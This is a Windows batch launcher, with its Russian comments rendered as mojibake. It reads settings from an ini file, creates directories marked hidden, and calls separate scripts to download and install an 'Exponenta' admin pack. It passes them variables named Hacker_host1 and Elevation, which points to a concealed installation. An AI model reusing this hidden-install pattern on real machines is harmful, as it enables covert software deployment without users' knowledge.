rem ���� ����㧪� � ��⠭���� �����-���� (��������᪨� ��ਠ��)
rem USAGE
rem > loadhttpmaindistribHidden.bat
rem ����᪠�� 䠩� � �ࠢ��� �����������

rem ���樠�����㥬 ��६���� ���㦥��� �ਯ�

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%~dp0
set workdir=%CD%

rem ��⠥� ����ன�� �� 䠩�� settings.txt, ����� ������ �ᯮ�������� �
rem ⮬ �� ��⠫���, �� � bat-䠩�. �᫨ �� 㤠���� �ᯠ���� ����ன�� -
rem ��室�� � ���㫥�� ����� ������.

cd /d %curdir%
call :read_settings installmaindistrib.tmp.ini || exit /b 1

rem Create Target Directories
md %PUB1%
md %PUB1%\Distrib\plugins
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\plugins

rem Go to Temprorary Directory

rem ����ࠨ���� ��६���� ���㦥��� ��� ������� Wget

rem ��।��塞 ��६����:

rem �᭮���� �����
rem set httpMainFolder=Exponenta
rem ��䨪� ��⮪���
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem run Load Distrib Scripts

if not exist "%curdir%URLLoadAdminPack.bat" goto pass_UrlLoad
echo "Download Installers..."
call "%curdir%URLLoadAdminPack.bat"
:pass_UrlLoad

rem Run PreChocoInstall.bat
rem if not exist "%curdir%prechocoinstall.bat" goto pass_PreCHInstall
rem echo "Pre Chocolatey install..."
rem call "%curdir%prechocoinstall.bat"
rem :pass_PreCHInstall

rem ����᪠�� ���⠫���� Admin Pack "��ᯮ����"

if not exist "%curdir%InstallAllExponenta.bat" goto pass_MainExponenta
echo "Installing Main Exponenta Files..."
call "%curdir%InstallAllExponenta.bat" %PUB1% %Hacker_host1% %AdminT% %Elevation% %Util%
:pass_MainExponenta

rem ����塞 �६���� ��⠫��
rd /S /Q WindowsPowerShell

cd /d %workdir%

rem ��室 �� �業���. ����� - ⮫쪮 �㭪樨.
exit /b 0

rem
rem �㭪�� ��� �⥭�� ����஥� �� 䠩��.
rem �室:
rem       %1           - ��� 䠩�� � ����ன����
:read_settings

set SETTINGSFILE=%1

rem �஢�ઠ ����⢮����� 䠩��
if not exist %SETTINGSFILE% (
    echo FAIL: ���� � ����ன���� ���������
    exit /b 1
)

rem ��ࠡ�⪠ 䠩�� c ����ன����
rem �����:
rem     eol=# 㪠�뢠�� �� �, �� ᮤ�ন��� ��ப� ��稭�� � ᨬ���� #
rem     � �� �� ���� ����� ���� �ய�饭� ��� �������਩.
rem
rem     delims== 㪠�뢠��, �� ࠧ����⥫�� ���祭�� ���� ᨬ��� =
rem
rem     tokens=1,2 �ਢ���� � ⮬�, �� � ��६����� %%i �㤥� ����ᥭ ����
rem     ⮪��, � � %%j - ��ன.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem � ��६����� i - ����
    rem � ��६����� j - ���祭��
    rem �� �࠭᫨�㥬 �� � ��६���� ���㦥���
    set %%i=%%j
)
exit /b 0

